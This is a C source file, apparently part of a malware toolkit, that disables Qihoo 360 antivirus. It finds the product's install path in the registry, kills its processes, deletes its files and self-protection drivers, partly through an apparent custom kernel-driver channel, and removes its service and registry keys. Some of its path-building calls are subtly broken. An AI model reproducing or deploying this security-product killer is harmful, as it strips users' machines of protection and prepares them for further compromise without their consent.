#include "stdafx.h"
#include "uninstall360.h"

void AnsiToUnicodeAndDeleteFile(char *lpFilePath)
{
	WCHAR lpwzProcName[1024];
	DWORD dwReadByte;

	ReadFile((HANDLE)KERNEL_SAFE_MODULE,0,0,&dwReadByte,0);

	memset(lpwzProcName,0,sizeof(lpwzProcName));

	MultiByteToWideChar(
		CP_ACP,
		0, 
		lpFilePath,
		-1, 
		lpwzProcName, 
		strlen(lpFilePath)
		);

	ReadFile((HANDLE)ONLY_DELETE_FILE,lpwzProcName,wcslen(lpwzProcName),&dwReadByte,0);
}
void enum_path(char *cpath)
{
	WIN32_FIND_DATAA wfd;
	HANDLE hfd;
	char cdir[MAX_PATH];
	char subdir[MAX_PATH];
	int r;
	char rebootdelfile[MAX_PATH];

	GetCurrentDirectoryA(MAX_PATH,cdir);
	SetCurrentDirectoryA(cpath);
	hfd = FindFirstFileA("*.*",&wfd);
	if(hfd!=INVALID_HANDLE_VALUE) {
		do{
			if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if(wfd.cFileName[0] != '.'){
					// 合成完整路径名
					sprintf(subdir,"%s\\%s",cpath,wfd.cFileName);
					// 递归枚举子目录
					enum_path(subdir);
				}
			}else{
				memset(rebootdelfile,0,sizeof(rebootdelfile));
				wsprintfA(rebootdelfile,"\\??\\%s\\%s",cpath,wfd.cFileName);
				SetFileAttributesA(rebootdelfile,FILE_ATTRIBUTE_NORMAL);
				AnsiToUnicodeAndDeleteFile(rebootdelfile);
				RemoveDirectoryA(cpath);
				MoveFileExA(rebootdelfile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				//OutputDebugStringA(rebootdelfile);
				//printf("%s\r\n",rebootdelfile);
				// 打印本次找到的文件路径
			}
		}while(r=FindNextFileA(hfd,&wfd),r!=0);
	}
	SetCurrentDirectoryA(cdir);
}
void Remove360Directory(char *cpath)
{
	WIN32_FIND_DATAA wfd;
	HANDLE hfd;
	char cdir[MAX_PATH];
	char subdir[MAX_PATH];
	int r;
	char rebootdelfile[MAX_PATH];

	GetCurrentDirectoryA(MAX_PATH,cdir);
	SetCurrentDirectoryA(cpath);
	hfd = FindFirstFileA("*.*",&wfd);
	if(hfd!=INVALID_HANDLE_VALUE) {
		do{
			if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if(wfd.cFileName[0] != '.'){
					// 合成完整路径名
					RemoveDirectoryA(cpath);
					sprintf(subdir,"%s\\%s",cpath,wfd.cFileName);
					RemoveDirectoryA(cpath);
					// 递归枚举子目录
					enum_path(subdir);
				}
			}else{
				
			}
		}while(r=FindNextFileA(hfd,&wfd),r!=0);
	}
	SetCurrentDirectoryA(cdir);
}
BOOL GetAntiVirusBin(char *lpszKey,char *lpszValue,char *lpDirectory)
{
	HKEY hKey;
	DWORD dwBufSize = 256;
	DWORD dwDataType = REG_EXPAND_SZ;
	unsigned char szQueryKey[256] = {0};
	char lpszBuffer[256] = {0};
	char lpszFileName[256] = {0};

	memset(lpDirectory,0,sizeof(lpDirectory));

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,lpszKey,NULL,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS)
	{
		RegQueryValueExA(hKey,lpszValue,NULL,&dwDataType,szQueryKey,&dwBufSize);
		RegCloseKey(hKey);

		if (*szQueryKey == '"')
		{
			//如果有双引号，则提取出没有双引号的路径
			//"C:\Program Files\ESET\ESET NOD32 Antivirus\ekrn.exe"
			memcpy(lpszBuffer,szQueryKey+1,strlen((char *)szQueryKey)-2);
		}
		else
		{
			memcpy(lpszBuffer,szQueryKey,strlen((char *)szQueryKey));
		}
		wsprintfA(lpDirectory,"%s",lpszBuffer);
		//OutputDebugStringA(lpDirectory);
		//memcpy(lpDirectory,lpszBuffer,strlen(lpszBuffer)-strlen(lpszFileName));
		return TRUE;
	}
	return FALSE;
}
DWORD GetProcessIdToKill( WCHAR *szProcName ) 
{ 
	PROCESSENTRY32 pe;   
	DWORD dwPid; 
	DWORD dwRet; 
	BOOL bFound = FALSE; 
	HANDLE hProcess;

	HANDLE hSP = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ); 
	if ( hSP ) 
	{ 
		pe.dwSize = sizeof( pe ); 

		for ( dwRet = Process32First( hSP, &pe ); 
			dwRet; 
			dwRet = Process32Next( hSP, &pe ) ) 
		{ 
			if (_wcsnicmp(pe.szExeFile,szProcName,wcslen(szProcName)) == 0)
			{
				hProcess = OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
				if (hProcess)
				{
					TerminateProcess(hProcess,-1);
					CloseHandle(hProcess);   //结束
					return TRUE;
				}
			}
		}
		CloseHandle( hSP ); 
	} 
	return FALSE; 
} 
VOID Uninstall360()
{
	char lpDriverDirectory[256] = {0};
	char lp360DriverFile[256] = {0};
	char lp360Directory[256] = {0};
	char lp360RealDirectory[256] = {0};
	char lp360SD[256] = {0};

	GetWindowsDirectoryA(lpDriverDirectory,sizeof(lpDriverDirectory));

	if (GetAntiVirusBin(
		"SYSTEM\\CurrentControlSet\\Services\\ZhuDongFangYu",
		"ImagePath",
		lp360Directory) == TRUE)
	{
		GetProcessIdToKill(L"360safe.exe");
		GetProcessIdToKill(L"360tray.exe");
		GetProcessIdToKill(L"zhudongfangyu.exe");

		memcpy(lp360RealDirectory,lp360Directory,strlen(lp360Directory)-strlen("\\deepscan\\ZhuDongFangYu.EXE"));

		enum_path(lp360RealDirectory);
		Remove360Directory(lp360RealDirectory);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\Hookport.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\360Box.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\360netmon.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\360SelfProtection.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\360AntiHacker.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\360Box");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\360netmon");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\360SelfProtection");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\HookPort");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\ZhuDongFangYu");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\360AntiHacker");

		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\360Safe");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\360SD");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\360softmgr");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\LiveUpdate360");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\360Desktop");
		
	}
	if (GetAntiVirusBin(
		"SYSTEM\\CurrentControlSet\\Services\\360rp",
		"ImagePath",
		lp360SD) == TRUE)
	{
		GetProcessIdToKill(L"360sd.exe");
		GetProcessIdToKill(L"360rps.exe");
		GetProcessIdToKill(L"360rp.exe");

		memset(lp360RealDirectory,0,sizeof(lp360RealDirectory));
		memcpy(lp360RealDirectory,lp360SD,strlen(lp360SD)-strlen("\\360rps.exe"));

		enum_path(lp360RealDirectory);
		Remove360Directory(lp360RealDirectory);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\BAPIDRV.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		memset(lp360DriverFile,0,sizeof(lp360DriverFile));
		wsprintfA(lp360DriverFile,"\\??\\%s",lpDriverDirectory,"\\system32\\drivers\\360AvFlt.sys");
		AnsiToUnicodeAndDeleteFile(lp360DriverFile);

		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\360rp");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\360AvFlt");
		SHDeleteKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\BAPIDRV");
	}
	return;
}